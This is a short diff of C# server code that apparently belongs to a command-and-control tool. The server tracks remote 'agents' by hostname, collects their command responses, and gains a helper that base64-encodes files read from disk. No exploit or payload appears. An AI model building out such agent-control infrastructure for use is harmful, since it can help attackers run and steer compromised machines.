@@ -169,7 +169,7 @@ namespace server{
             } else if (root.TryGetProperty("response", out JsonElement response)) {
                 //get and parse a client response
                 this.agents[hostname.GetString()].commandResp.Add(response.ToString());
-                return Base64Encode("{\"response\": \"thanks\"}");
+                return Base64EncodeString("{\"response\": \"thanks\"}");
             } else {
                 return HttpStatusCode.NotFound.ToString();
             }
@@ -209,7 +209,12 @@ namespace server{
             return "{\"commands\": " + commands + "}";
         }
 
-        private string Base64Encode(string str){
+        public string Base64EncodeFile(string path){
+            //takes a path and returns a base64 encoded file
+            Byte[] bytes = File.ReadAllBytes(path);
+            return Convert.ToBase64String(bytes);
+        }
+        private string Base64EncodeString(string str){
             //takes a string and returns it in base64
             return Convert.ToBase64String(Encoding.ASCII.GetBytes(str));
         }
